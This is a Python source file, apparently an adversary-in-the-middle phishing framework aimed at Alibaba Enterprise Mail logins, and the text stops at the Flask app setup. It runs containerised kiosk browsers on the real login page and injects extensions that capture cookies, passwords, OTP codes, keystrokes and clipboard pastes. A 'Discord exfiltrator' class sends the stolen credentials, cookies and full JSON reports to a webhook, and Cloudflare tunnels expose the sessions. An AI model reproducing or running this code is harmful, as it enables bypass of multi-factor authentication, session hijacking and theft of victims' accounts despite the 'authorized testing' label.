#!/usr/bin/env python3
"""
BitB MFA Bypass Framework – Enterprise Assessment Edition v2.1
Target: qiye.aliyun.com (Alibaba Enterprise Mail / DingTalk)
Authorized Penetration Testing Use Only

FEATURES:
  - Browser extension-based cookie & credential extraction
  - IP-based access control (whitelist/blacklist per session)
  - Systemd service integration (auto-start, watchdog, log rotation)
  - Discord alerting on captured credentials
  - Cloudflare tunneling (API + per-session VNC)
  - Session cleanup after timeout
  - Replay engine for stolen sessions
"""

import os
import re
import json
import time
import uuid
import socket
import shutil
import logging
import threading
import subprocess
import requests
import signal
import sys
import argparse
import ipaddress
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, List, Any, Set, Callable
from http import HTTPStatus

import docker
from flask import Flask, request, jsonify, render_template_string
from flask_socketio import SocketIO, emit
from werkzeug.serving import make_server

# ─── Try importing extension manager (optional) ──────────────────────────
try:
    from bitb_extensions import ExtensionManager
    HAS_EXT_MANAGER = True
except ImportError:
    HAS_EXT_MANAGER = False
    ExtensionManager = None

# ─── Configuration ───────────────────────────────────────────────────────────
CONFIG = {
    "docker_image": "jlesage/firefox",
    "listen_host": "0.0.0.0",
    "listen_port_api": 8080,
    "target_url": "https://qiye.aliyun.com/",
    "session_dir": "/data/sessions",
    "exfil_dir": "/data/exfiltrated",
    "log_dir": "/var/log/bitb",
    "session_timeout": 3600,
    "container_memory": "1g",
    "container_cpu_quota": 50000,
    "next_port": 5900,
    "pid_file": "/var/run/bitb/bitb.pid",

    # Browser extensions
    "inject_extensions": True,
    "extension_poll_interval": 10,

    # Access control
    "access_control_enabled": True,
    "default_access_mode": "open",
    "auto_whitelist_local": True,
    "access_control_chain": "BITB",
    "access_control_dir": "/data/bitb/access_control",

    # Discord
    "discord_webhook_url": "YOUR_DISCORD_WEBHOOK_URL_HERE",

    # Cloudflare
    "cloudflare_tunnel_enabled": True,

    # Daemon
    "daemon_enabled": False,
    "auto_restart": False,

    "credential_keywords": [
        "password", "passwd", "pwd", "login", "username", "email",
        "aliyunId", "aliyun_id", "account", "secret", "token",
        "dingtalk", "alipay", "mfa", "otp", "2fa", "验证码",
    ],
}

# ─── Logging ─────────────────────────────────────────────────────────────────
os.makedirs(CONFIG["log_dir"], exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s - %(message)s",
    handlers=[
        logging.FileHandler(f"{CONFIG['log_dir']}/bitb.log"),
        logging.StreamHandler()
    ]
)
log = logging.getLogger("bitb")
logging.getLogger("docker").setLevel(logging.WARNING)
logging.getLogger("urllib3").setLevel(logging.WARNING)
logging.getLogger("werkzeug").setLevel(logging.WARNING)


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 1: DISCORD EXFILTRATOR
# ═══════════════════════════════════════════════════════════════════════════════

class DiscordExfiltrator:
    def __init__(self, webhook_url: str):
        self.webhook_url = webhook_url
        self.session = requests.Session()
        self._last_creds_hash = set()

    def _enabled(self) -> bool:
        return bool(self.webhook_url) and self.webhook_url != "YOUR_DISCORD_WEBHOOK_URL_HERE"

    def send_alert(self, message: str, level: str = "info"):
        if not self._enabled():
            return
        colors = {"info": 0x00aaff, "warning": 0xffaa00, "success": 0x00ff88, "critical": 0xff3355}
        data = {
            "embeds": [{
                "title": "BitB Framework Notification",
                "description": message,
                "color": colors.get(level, 0x00aaff),
                "timestamp": datetime.utcnow().isoformat(),
            }]
        }
        try:
            self.session.post(self.webhook_url, json=data, timeout=10)
        except:
            pass

    def send_credentials(self, user_id: str, credentials: Dict[str, str], source: str = "extension_capture"):
        if not self._enabled() or not credentials:
            return
        cred_hash = hash(str(sorted(credentials.items())))
        if cred_hash in self._last_creds_hash:
            return
        self._last_creds_hash.add(cred_hash)
        if len(self._last_creds_hash) > 100:
            self._last_creds_hash.clear()

        embed = {
            "title": f"🔑 Credentials Captured: {user_id}",
            "color": 0x00ff88,
            "fields": [
                {"name": "👤 User ID", "value": user_id, "inline": True},
                {"name": "📡 Source", "value": source, "inline": True},
                {"name": "⏰ Timestamp", "value": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"), "inline": False},
            ],
            "footer": {"text": "BitB MFA Bypass Framework | Authorized Assessment"},
        }
        for key, value in credentials.items():
            if value:
                embed["fields"].append({"name": f"🔐 {key}", "value": f"```{str(value)[:500]}```", "inline": False})
        data = {"embeds": [embed], "content": f"@here **New credentials from {user_id}**"}
        try:
            resp = self.session.post(self.webhook_url, json=data, timeout=10)
            log.info(f"Discord credential send: {resp.status_code}")
        except Exception as e:
            log.error(f"Discord send failed: {e}")

    def send_cookies(self, user_id: str, session_id: str, cookies: Dict[str, Any], source: str = "extension"):
        if not self._enabled() or not cookies:
            return
        cookie_lines = []
        count = 0
        for domain_cookie, info in cookies.items():
            if "::" in domain_cookie:
                name = domain_cookie.split("::", 1)[1]
            else:
                name = domain_cookie
            val = info.get("value", "") if isinstance(info, dict) else str(info)
            cookie_lines.append(f"{name}={val}")
            count += 1
            if count >= 15:
                cookie_lines.append(f"... and {len(cookies) - 15} more")
                break
        cookie_text = "\n".join(cookie_lines)
        if len(cookie_text) > 900:
            cookie_text = cookie_text[:897] + "..."
        embed = {
            "title": f"🍪 Session Cookies: {user_id}",
            "color": 0xffaa00,
            "fields": [
                {"name": "👤 User", "value": user_id, "inline": True},
                {"name": "📦 Count", "value": str(len(cookies)), "inline": True},
                {"name": "🍪 Cookies", "value": f"```{cookie_text}```", "inline": False},
            ],
        }
        try:
            self.session.post(self.webhook_url, json={"embeds": [embed]}, timeout=10)
        except Exception as e:
            log.error(f"Discord cookie send failed: {e}")

    def send_full_report(self, user_id: str, session_id: str, exfil_data: Dict):
        if not self._enabled():
            return
        cookies = exfil_data.get("cookies", {})
        creds = exfil_data.get("credentials", {})
        ls_items = exfil_data.get("localstorage", {})
        embed = {
            "title": f"📊 Full Report: {user_id}",
            "color": 0xff3355,
            "fields": [
                {"name": "👤 User", "value": user_id, "inline": True},
                {"name": "🍪 Cookies", "value": str(len(cookies)), "inline": True},
                {"name": "🔑 Cred Artifacts", "value": str(len(creds)), "inline": True},
                {"name": "💾 localStorage", "value": str(len(ls_items)), "inline": True},
                {"name": "⏰ Time", "value": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"), "inline": False},
            ],
        }
        tmp_path = f"/tmp/exfil_report_{session_id[:16]}.json"
        with open(tmp_path, "w") as f:
            json.dump(exfil_data, f, indent=2, default=str)
        try:
            with open(tmp_path, "rb") as f:
                files = {
                    "payload_json": (None, json.dumps({"embeds": [embed]}), "application/json"),
                    "file": (f"exfil_{user_id}_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.json", f, "application/json"),
                }
                self.session.post(self.webhook_url, files=files, timeout=30)
            log.info(f"Sent full report to Discord: {user_id}")
            os.unlink(tmp_path)
        except Exception as e:
            log.error(f"Discord full report send failed: {e}")


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 2: CLOUDFLARE TUNNEL MANAGER
# ═══════════════════════════════════════════════════════════════════════════════

class CloudflareTunnelManager:
    def __init__(self):
        self.api_tunnel_url = None
        self.active_tunnels: Dict[str, subprocess.Popen] = {}
        self.tunnel_url_map: Dict[str, str] = {}

    def _wait_for_tcp_port(self, host: str, port: int, timeout: float = 15.0) -> bool:
        start = time.time()
        while time.time() - start < timeout:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((host, port))
                sock.close()
                if result == 0:
                    return True
            except:
                pass
            time.sleep(0.5)
        return False

    def start_api_tunnel(self, port: int) -> Optional[str]:
        try:
            import pycloudflared
            log.info(f"Starting API tunnel to port {port}...")
            self._wait_for_tcp_port("127.0.0.1", port, timeout=10)
            result = pycloudflared.try_cloudflare(port=port, verbose=False)
            self.api_tunnel_url = str(result.tunnel)
            log.info(f"API tunnel active: {self.api_tunnel_url}")
            return self.api_tunnel_url
        except Exception as e:
            log.error(f"API tunnel failed: {e}")
            return None

    def start_vnc_tunnel(self, vnc_port: int, session_id: str) -> Optional[str]:
        try:
            import pycloudflared
            log.info(f"Starting VNC tunnel for {session_id[:16]} on port {vnc_port}")
            if not self._wait_for_tcp_port("127.0.0.1", vnc_port, timeout=20):
                return None
            time.sleep(2)
            result = pycloudflared.try_cloudflare(port=vnc_port, verbose=False)
            tunnel_url = str(result.tunnel)
            self.active_tunnels[session_id] = result.process
            self.tunnel_url_map[session_id] = tunnel_url
            log.info(f"VNC tunnel active: {tunnel_url}")
            return tunnel_url
        except Exception as e:
            log.error(f"VNC tunnel failed: {e}")
            return None

    def get_api_url(self) -> Optional[str]:
        return self.api_tunnel_url

    def stop_all_tunnels(self):
        log.info("Stopping all tunnels...")
        for sid, proc in self.active_tunnels.items():
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except:
                pass
        self.active_tunnels.clear()


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 3: EXTENSION EXFIL RECEIVER
# ═══════════════════════════════════════════════════════════════════════════════

class ExtensionExfilReceiver:
    def __init__(self, discord: DiscordExfiltrator = None):
        self.discord = discord
        self.pending_data: List[Dict] = []
        self.lock = threading.Lock()
        self._processor_thread = threading.Thread(target=self._processor_loop, daemon=True)
        self._processor_thread.start()
        self._cookie_count = 0
        self._cred_count = 0
    
    def receive(self, data: Dict) -> bool:
        with self.lock:
            self.pending_data.append({"data": data, "received": time.time()})
        return True
    
    def _processor_loop(self):
        while True:
            time.sleep(0.5)
            items = []
            with self.lock:
                if self.pending_data:
                    items = self.pending_data.copy()
                    self.pending_data.clear()
            for item in items:
                try:
                    self._process_item(item["data"])
                except Exception as e:
                    log.error(f"Error processing extension data: {e}")
    
    def _process_item(self, data: Dict):
        ext_type = data.get("type", "unknown")
        payload = data.get("data", {})
        metadata = data.get("metadata", {})
        url = metadata.get("url", "unknown")
        log.info(f"[Extension Exfil] Type={ext_type} | URL={url[:80]}")
        
        if ext_type == "cookies":
            self._handle_cookies(payload, metadata)
        elif ext_type in ("credential", "form_submit", "autofill_capture", "field_change", "autofill_detected"):
            self._handle_credentials(payload, metadata)
        elif ext_type == "keystroke":
            self._handle_keystroke(payload, metadata)
        elif ext_type == "navigation":
            pass
        elif ext_type == "clipboard_paste":
            self._handle_keystroke(payload, metadata)
    
    def _handle_cookies(self, payload: Dict, metadata: Dict):
        all_cookies = payload.get("all", 0)
        priority = payload.get("priority", {})
        self._cookie_count += all_cookies
        log.info(f"  Cookies: {all_cookies} total, {len(priority)} priority")
        user_id = metadata.get("title", "unknown").split(" - ")[0]
        if priority and self.discord:
            self.discord.send_cookies(user_id, "extension", priority, source="extension")
        self._save_cookie_data(payload, metadata)
    
    def _handle_credentials(self, payload: Dict, metadata: Dict):
        url = metadata.get("url", "unknown")
        creds = payload
        if isinstance(payload, dict) and "payload" in payload:
            creds = payload["payload"]
        extracted = {}
        for key, value in (creds.items() if isinstance(creds, dict) else [("value", str(creds))]):
            if value and str(value).strip():
                extracted[str(key)] = str(value)[:500]
        if extracted:
            self._cred_count += 1
            log.info(f"  Credentials: {len(extracted)} fields from {url[:60]}")
            user_id = "unknown"
            for key in ["username", "email", "user", "login", "phone", "mobile"]:
                if key in extracted:
                    user_id = extracted[key][:30]
                    break
            if self.discord:
                self.discord.send_credentials(user_id, extracted, source="browser_extension")
            self._save_credential_data(extracted, metadata)
    
    def _handle_keystroke(self, payload: Dict, metadata: Dict):
        url = metadata.get("url", "unknown")
        field = payload.get("field", "unknown")
        value = payload.get("value", "")
        sensitive = payload.get("sensitive", False)
        if value and sensitive:
            log.info(f"  Keystroke: {field} ({len(value)} chars) from {url[:60]}")
            if self.discord:
                self.discord.send_credentials(f"keystroke_{field}", {field: value}, source="keystroke_capture")
    
    def _save_cookie_data(self, payload: Dict, metadata: Dict):
        exfil_dir = Path(CONFIG["exfil_dir"]) / "extensions" / "cookies"
        exfil_dir.mkdir(parents=True, exist_ok=True)
        ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        url_short = re.sub(r'[^a-zA-Z0-9]', '_', metadata.get("url", "unknown")[:40])
        fp = exfil_dir / f"cookies_{url_short}_{ts}.json"
        with open(fp, "w") as f:
            json.dump({"type": "cookies", "data": payload, "metadata": metadata, "received_at": datetime.utcnow().isoformat()}, f, indent=2, default=str)
    
    def _save_credential_data(self, creds: Dict, metadata: Dict):
        exfil_dir = Path(CONFIG["exfil_dir"]) / "extensions" / "credentials"
        exfil_dir.mkdir(parents=True, exist_ok=True)
        ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        url_short = re.sub(r'[^a-zA-Z0-9]', '_', metadata.get("url", "unknown")[:40])
        label = "cred"
        for key in ["username", "email", "user", "login"]:
            if key in creds:
                label = re.sub(r'[^a-zA-Z0-9]', '_', str(creds[key])[:20])
                break
        fp = exfil_dir / f"creds_{label}_{url_short}_{ts}.json"
        with open(fp, "w") as f:
            json.dump({"type": "credential", "data": creds, "metadata": metadata, "received_at": datetime.utcnow().isoformat()}, f, indent=2, default=str)
    
    def get_counts(self):
        return {"cookies": self._cookie_count, "credentials": self._cred_count}


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 4: IP ACCESS CONTROLLER
# ═══════════════════════════════════════════════════════════════════════════════

class IPAccessController:
    def __init__(self, chain_prefix: str = "BITB"):
        self.chain_prefix = chain_prefix
        self.global_whitelist: Set[str] = set()
        self.global_blacklist: Set[str] = set()
        self.session_access: Dict[str, Dict] = {}
        self.lock = threading.Lock()
        self._enabled = False
        self._initialized = False
        self._access_dir = Path(CONFIG["access_control_dir"])
        self._access_dir.mkdir(parents=True, exist_ok=True)
        self._load_rules()

    def initialize(self):
        if self._initialized:
            return
        try:
            self._iptables("-N", self.chain_prefix, check=False)
            self._iptables("-N", f"{self.chain_prefix}_WHITELIST", check=False)
            self._iptables("-N", f"{self.chain_prefix}_BLACKLIST", check=False)
            self._iptables("-I", "INPUT", "1", "-j", self.chain_prefix, check=False)
            self._iptables("-A", self.chain_prefix, "-j", f"{self.chain_prefix}_WHITELIST", check=False)
            self._iptables("-A", f"{self.chain_prefix}_BLACKLIST", "-j", "RETURN", check=False)
            self._enabled = True
            self._initialized = True
            log.info("✅ IP access control initialized with iptables chains")
            self._apply_all_rules()
        except Exception as e:
            log.warning(f"⚠️  Could not initialize iptables (run as root?): {e}")
            log.warning("   IP access control will use software-level filtering only")
            self._enabled = False
            self._initialized = True

    def cleanup(self):
        if not self._initialized:
            return
        try:
            self._iptables("-F", self.chain_prefix, check=False)
            self._iptables("-F", f"{self.chain_prefix}_WHITELIST", check=False)
            self._iptables("-F", f"{self.chain_prefix}_BLACKLIST", check=False)
            self._iptables("-D", "INPUT", "-j", self.chain_prefix, check=False)
            self._iptables("-X", self.chain_prefix, check=False)
            self._iptables("-X", f"{self.chain_prefix}_WHITELIST", check=False)
            self._iptables("-X", f"{self.chain_prefix}_BLACKLIST", check=False)
            log.info("🧹 IP access control iptables chains cleaned up")
        except Exception as e:
            log.warning(f"Cleanup error: {e}")

    def _iptables(self, *args, check: bool = True) -> bool:
        try:
            cmd = ["iptables"] + list(args)
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            if result.returncode != 0 and check:
                return False
            return result.returncode == 0
        except:
            return False

    def _validate_ip(self, ip_str: str) -> bool:
        try:
            if "/" in ip_str:
                ipaddress.ip_network(ip_str, strict=False)
            else:
                ipaddress.ip_address(ip_str)
            return True
        except ValueError:
            return False

    def _ip_in_cidr(self, ip: str, cidr: str) -> bool:
        try:
            addr = ipaddress.ip_address(ip)
            if "/" in cidr:
                return addr in ipaddress.ip_network(cidr, strict=False)
            else:
                return addr == ipaddress.ip_address(cidr)
        except ValueError:
            return False

    def add_to_whitelist(self, ip_or_cidr: str) -> bool:
        if not self._validate_ip(ip_or_cidr):
            return False
        with self.lock:
            self.global_whitelist.add(ip_or_cidr)
            self._save_rules()
            self._apply_whitelist_rules()
        log.info(f"➕ Added to global whitelist: {ip_or_cidr}")
        return True

    def remove_from_whitelist(self, ip_or_cidr: str) -> bool:
        with self.lock:
            if ip_or_cidr in self.global_whitelist:
                self.global_whitelist.discard(ip_or_cidr)
                self._save_rules()
                self._apply_whitelist_rules()
                return True
        return False

    def add_to_blacklist(self, ip_or_cidr: str) -> bool:
        if not self._validate_ip(ip_or_cidr):
            return False
        with self.lock:
            self.global_blacklist.add(ip_or_cidr)
            self._save_rules()
            self._apply_blacklist_rules()
        log.info(f"🚫 Added to global blacklist: {ip_or_cidr}")
        return True

    def remove_from_blacklist(self, ip_or_cidr: str) -> bool:
        with self.lock:
            if ip_or_cidr in self.global_blacklist:
                self.global_blacklist.discard(ip_or_cidr)
                self._save_rules()
                self._apply_blacklist_rules()
                return True
        return False

    def set_session_access(self, session_id: str, whitelist: Optional[List[str]] = None,
                          blacklist: Optional[List[str]] = None, mode: str = "whitelist") -> bool:
        if mode not in ("whitelist", "blacklist"):
            return False
        for ip_list, name in [(whitelist or [], "whitelist"), (blacklist or [], "blacklist")]:
            for ip in ip_list:
                if not self._validate_ip(ip):
                    log.error(f"Invalid IP in {name}: {ip}")
                    return False
        with self.lock:
            self.session_access[session_id] = {
                "whitelist": set(whitelist or []),
                "blacklist": set(blacklist or []),
                "mode": mode,
                "updated_at": time.time()
            }
            self._save_rules()
        log.info(f"🔒 Session {session_id[:16]} access set to {mode} mode")
        return True

    def remove_session_access(self, session_id: str):
        with self.lock:
            if session_id in self.session_access:
                del self.session_access[session_id]
                self._save_rules()

    def check_session_access(self, session_id: str, client_ip: str, port: int) -> bool:
        for cidr in self.global_blacklist:
            if self._ip_in_cidr(client_ip, cidr):
                log.info(f"🚫 DENIED (global blacklist): {client_ip} -> {session_id[:16]}")
                return False
        for cidr in self.global_whitelist:
            if self._ip_in_cidr(client_ip, cidr):
                return True
        with self.lock:
            rules = self.session_access.get(session_id)
        if rules:
            if rules["mode"] == "whitelist":
                for cidr in rules["whitelist"]:
                    if self._ip_in_cidr(client_ip, cidr):
                        return True
                log.info(f"🚫 DENIED (session whitelist): {client_ip} -> {session_id[:16]}")
                return False
            else:
                for cidr in rules["blacklist"]:
                    if self._ip_in_cidr(client_ip, cidr):
                        log.info(f"🚫 DENIED (session blacklist): {client_ip} -> {session_id[:16]}")
                        return False
                return True
        if self.global_whitelist:
            log.info(f"🚫 DENIED (default): {client_ip} -> {session_id[:16]}")
            return False
        return True

    def _apply_whitelist_rules(self):
        if not self._enabled:
            return
        self._iptables("-F", f"{self.chain_prefix}_WHITELIST")
        for cidr in self.global_whitelist:
            self._iptables("-A", f"{self.chain_prefix}_WHITELIST", "-s", cidr, "-j", "RETURN")
        if self.global_whitelist:
            self._iptables("-A", f"{self.chain_prefix}_WHITELIST", "-j", "DROP")

    def _apply_blacklist_rules(self):
        if not self._enabled:
            return
        self._iptables("-F", f"{self.chain_prefix}_BLACKLIST")
        for cidr in self.global_blacklist:
            self._iptables("-A", f"{self.chain_prefix}_BLACKLIST", "-s", cidr, "-j", "DROP")
        self._iptables("-A", f"{self.chain_prefix}_BLACKLIST", "-j", "RETURN")

    def _apply_all_rules(self):
        if not self._enabled:
            return
        self._apply_whitelist_rules()
        self._apply_blacklist_rules()

    def _save_rules(self):
        try:
            data = {
                "global_whitelist": sorted(self.global_whitelist),
                "global_blacklist": sorted(self.global_blacklist),
                "session_access": {
                    sid: {
                        "whitelist": sorted(r["whitelist"]),
                        "blacklist": sorted(r["blacklist"]),
                        "mode": r["mode"],
                        "updated_at": r.get("updated_at", time.time())
                    } for sid, r in self.session_access.items()
                },
                "updated_at": time.time()
            }
            (self._access_dir / "session_access.json").write_text(json.dumps(data, indent=2))
        except Exception as e:
            log.error(f"Failed to save access rules: {e}")

    def _load_rules(self):
        try:
            rules_file = self._access_dir / "session_access.json"
            if rules_file.exists():
                data = json.loads(rules_file.read_text())
                self.global_whitelist = set(data.get("global_whitelist", []))
                self.global_blacklist = set(data.get("global_blacklist", []))
                for sid, rules in data.get("session_access", {}).items():
                    self.session_access[sid] = {
                        "whitelist": set(rules.get("whitelist", [])),
                        "blacklist": set(rules.get("blacklist", [])),
                        "mode": rules.get("mode", "whitelist"),
                        "updated_at": rules.get("updated_at", time.time())
                    }
                log.info(f"📂 Loaded access rules: {len(self.global_whitelist)} whitelist, {len(self.global_blacklist)} blacklist, {len(self.session_access)} session rules")
        except Exception as e:
            log.warning(f"Could not load access rules: {e}")

    def get_status(self) -> Dict:
        with self.lock:
            return {
                "enabled": self._enabled,
                "initialized": self._initialized,
                "global_whitelist": sorted(self.global_whitelist),
                "global_blacklist": sorted(self.global_blacklist),
                "session_access": {
                    sid: {
                        "whitelist": sorted(r["whitelist"]),
                        "blacklist": sorted(r["blacklist"]),
                        "mode": r["mode"]
                    } for sid, r in self.session_access.items()
                }
            }


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 5: SESSION MANAGER
# ═══════════════════════════════════════════════════════════════════════════════

class SessionManager:
    def __init__(self, discord_exfiltrator: DiscordExfiltrator = None, ext_manager: Optional[object] = None):
        self.docker_client = docker.from_env()
        self.sessions: Dict[str, dict] = {}
        self.lock = threading.Lock()
        self.discord = discord_exfiltrator
        self.ext_manager = ext_manager
        self._next_port = CONFIG["next_port"]
        self._port_lock = threading.Lock()
        self._start_cleanup_thread()

    def _get_next_port(self) -> int:
        with self._port_lock:
            port = self._next_port
            self._next_port += 1
            return port

    def sanitize_user_id(self, user_id: str) -> str:
        sanitized = re.sub(r'[^a-zA-Z0-9_.-]', '_', user_id)
        return sanitized or f"user_{uuid.uuid4().hex[:8]}"

    def create_session(self, user_id: str, target_url: str = None) -> Dict:
        safe_id = self.sanitize_user_id(user_id)
        session_id = f"{safe_id}_{uuid.uuid4().hex[:12]}"
        vol_path = Path(CONFIG["session_dir"]) / session_id
        vol_path.mkdir(parents=True, exist_ok=True)
        url = target_url or CONFIG["target_url"]
        vnc_port = self._get_next_port()

        volumes = {str(vol_path): {'bind': '/config', 'mode': 'rw'}}

        # Inject browser extensions
        if CONFIG["inject_extensions"] and self.ext_manager:
            try:
                ext_paths = self.ext_manager.get_extension_paths()
                if ext_paths:
                    from pathlib import Path as P
                    build_dir = P("extensions/build")
                    if not build_dir.exists():
                        build_dir = P("extensions/build")
                    if build_dir.exists():
                        volumes[str(build_dir.absolute())] = {'bind': '/extensions', 'mode': 'ro'}
                    policies = self.ext_manager.generate_policies_json(ext_paths)
                    (vol_path / "policies.json").write_text(policies)
                    prefs = self.ext_manager.generate_prefs_js()
                    (vol_path / "prefs.js").write_text(prefs)
                    log.info(f"  Extensions to inject: {[P(p).name for p in ext_paths]}")
            except Exception as e:
                log.warning(f"  Extension injection skipped: {e}")

        env = {
            "FF_KIOSK": "1", "FF_OPEN_URL": url,
            "DISPLAY_WIDTH": "1280", "DISPLAY_HEIGHT": "720", "FF_OPEN_URL_WAIT": "3",
        }
        if CONFIG["inject_extensions"]:
            env["FF_POLICIES"] = "/config/policies.json"
            env["ENABLE_FF_SCRIPTING"] = "1"

        try:
            container = self.docker_client.containers.run(
                CONFIG["docker_image"], detach=True,
                name=f"bitb_{session_id}",
                ports={'5800/tcp': vnc_port},
                volumes=volumes,
                environment=env,
                mem_limit=CONFIG["container_memory"],
                memswap_limit=CONFIG["container_memory"],
                cpu_quota=CONFIG["container_cpu_quota"],
                pids_limit=200, shm_size="2g", auto_remove=True,
                extra_hosts={"host.docker.internal": "host-gateway"},
                healthcheck={
                    "test": ["CMD", "curl", "-f", "http://localhost:5800"],
                    "interval": 30_000_000_000, "retries": 3, "start_period": 15_000_000_000,
                }
            )

            session_info = {
                "session_id": session_id, "user_id": safe_id,
                "container_id": container.id, "container_name": container.name,
                "vnc_port": vnc_port, "vnc_url": f"http://127.0.0.1:{vnc_port}",
                "target_url": url,
                "created_at": datetime.utcnow().isoformat(),
                "last_heartbeat": datetime.utcnow().isoformat(),
                "vol_path": str(vol_path),
                "extensions_injected": CONFIG["inject_extensions"],
                "cookies": {}, "localstorage": {}, "credentials": {},
                "exfiltrated": False, "tunnel_url": None,
            }
            with self.lock:
                self.sessions[session_id] = session_info
            log.info(f"Session created: {session_id[:20]} -> port {vnc_port}")
            if self.discord:
                self.discord.send_alert(f"New session for **{safe_id}**\nPort: `{vnc_port}`", level="info")
            return session_info
        except docker.errors.DockerException as e:
            log.error(f"Container creation failed: {e}")
            raise

    def get_session(self, session_id: str) -> Optional[Dict]:
        with self.lock:
            return self.sessions.get(session_id)

    def heartbeat(self, session_id: str) -> bool:
        with self.lock:
            if session_id in self.sessions:
                self.sessions[session_id]["last_heartbeat"] = datetime.utcnow().isoformat()
                return True
            return False

    def destroy_session(self, session_id: str):
        with self.lock:
            session = self.sessions.pop(session_id, None)
        if not session:
            return
        try:
            container = self.docker_client.containers.get(session["container_id"])
            container.stop(timeout=10)
            log.info(f"Session destroyed: {session_id[:16]}")
        except:
            pass

    def _start_cleanup_thread(self):
        def cleanup_loop():
            while True:
                time.sleep(60)
                now = datetime.utcnow()
                to_kill = []
                with self.lock:
                    for sid, info in self.sessions.items():
                        last_beat = datetime.fromisoformat(info["last_heartbeat"])
                        if (now - last_beat).total_seconds() > CONFIG["session_timeout"]:
                            to_kill.append(sid)
                for sid in to_kill:
                    log.info(f"Session {sid[:16]} timed out")
                    self.destroy_session(sid)
        t = threading.Thread(target=cleanup_loop, daemon=True)
        t.start()


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 6: DAEMON MANAGER
# ═══════════════════════════════════════════════════════════════════════════════

class DaemonManager:
    def __init__(self, shutdown_callback: Optional[Callable] = None):
        self.shutdown_callback = shutdown_callback
        self._shutdown_event = threading.Event()
        self._shutdown_in_progress = False
        self._pid = os.getpid()
        self._start_time = time.time()
        self._is_systemd = self._detect_systemd()
        Path(CONFIG["pid_file"]).parent.mkdir(parents=True, exist_ok=True)

    def _detect_systemd(self) -> bool:
        try:
            return (os.environ.get("INVOCATION_ID") is not None or
                    os.environ.get("JOURNAL_STREAM") is not None or
                    subprocess.run(["systemctl", "is-system-running"], capture_output=True, timeout=5).returncode == 0)
        except:
            return False

    def write_pid_file(self) -> bool:
        try:
            Path(CONFIG["pid_file"]).write_text(str(self._pid))
            log.info(f"📝 PID file written: {CONFIG['pid_file']} ({self._pid})")
            return True
        except Exception as e:
            log.error(f"Failed to write PID file: {e}")
            return False

    def remove_pid_file(self):
        try:
            Path(CONFIG["pid_file"]).unlink(missing_ok=True)
        except:
            pass

    def check_running(self) -> bool:
        pf = Path(CONFIG["pid_file"])
        if not pf.exists():
            return False
        try:
            old_pid = int(pf.read_text().strip())
            os.kill(old_pid, 0)
            log.warning(f"⚠️  Another BitB instance is running (PID: {old_pid})")
            return True
        except (ProcessLookupError, ValueError):
            pf.unlink(missing_ok=True)
            return False
        except:
            return False

    def setup_signal_handlers(self):
        signal.signal(signal.SIGTERM, self._handle_signal)
        signal.signal(signal.SIGINT, self._handle_signal)
        signal.signal(signal.SIGHUP, self._handle_signal)
        signal.signal(signal.SIGUSR1, self._handle_signal)
        log.info("🔔 Signal handlers registered")

    def _handle_signal(self, signum: int, frame):
        sig_name = signal.Signals(signum).name
        if signum == signal.SIGHUP:
            log.info("🔄 Received SIGHUP - reloading configuration")
            if hasattr(self, '_on_reload'):
                self._on_reload()
            return
        if signum == signal.SIGUSR1:
            log.info("📊 Received SIGUSR1 - dumping status")
            if hasattr(self, '_on_status'):
                self._on_status()
            return
        log.info(f"🛑 Received {sig_name}, initiating graceful shutdown...")
        self.initiate_shutdown()

    def set_reload_callback(self, callback: Callable):
        self._on_reload = callback

    def set_status_callback(self, callback: Callable):
        self._on_status = callback

    def initiate_shutdown(self):
        if self._shutdown_in_progress:
            return
        self._shutdown_in_progress = True
        self._shutdown_event.set()
        log.info("🛑 Graceful shutdown initiated...")
        if self.shutdown_callback:
            try:
                self.shutdown_callback()
            except Exception as e:
                log.error(f"Shutdown callback error: {e}")
        self.remove_pid_file()
        self._notify_systemd("STOPPING=1")
        log.info("👋 BitB shutdown complete")

    def wait_for_shutdown(self, timeout: Optional[float] = None) -> bool:
        return self._shutdown_event.wait(timeout=timeout)

    def is_shutdown_requested(self) -> bool:
        return self._shutdown_event.is_set()

    def _notify_systemd(self, state: str):
        if not self._is_systemd:
            return
        sock_path = os.environ.get("NOTIFY_SOCKET")
        if sock_path:
            try:
                s = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
                addr = f"\0{sock_path[1:]}" if sock_path.startswith("@") else sock_path
                s.connect(addr)
                s.sendall(state.encode())
                s.close()
            except:
                pass

    def systemd_ready(self):
        self._notify_systemd("READY=1")
        log.info("✅ Systemd readiness notification sent")

    def systemd_watchdog(self):
        self._notify_systemd("WATCHDOG=1")

    def set_restart_flag(self):
        flag_file = Path("/data/bitb/.restart_flag")
        flag_file.parent.mkdir(parents=True, exist_ok=True)
        flag_file.write_text(str(time.time()))
        log.info("🔄 Restart flag set")

    def clear_restart_flag(self):
        Path("/data/bitb/.restart_flag").unlink(missing_ok=True)

    def should_restart(self) -> bool:
        return Path("/data/bitb/.restart_flag").exists()

    def get_status(self) -> Dict[str, Any]:
        return {
            "pid": self._pid, "running": True,
            "uptime": time.time() - self._start_time,
            "systemd": self._is_systemd,
            "pid_file": CONFIG["pid_file"],
            "shutdown_requested": self._shutdown_event.is_set(),
            "restart_pending": self.should_restart(),
        }


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 7: FLASK APP & DASHBOARD
# ═══════════════════════════════════════════════════════════════════════════════

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(32)
socketio = SocketIO(app, cors_allowed_origins="*")

# Global instances (initialized in main())
discord_exfil = None
ext_manager = None
ext_receiver = None
sm = None
tunnel_manager = None
ip_access_controller = None
daemon_manager = None
global_tunnel_url = None


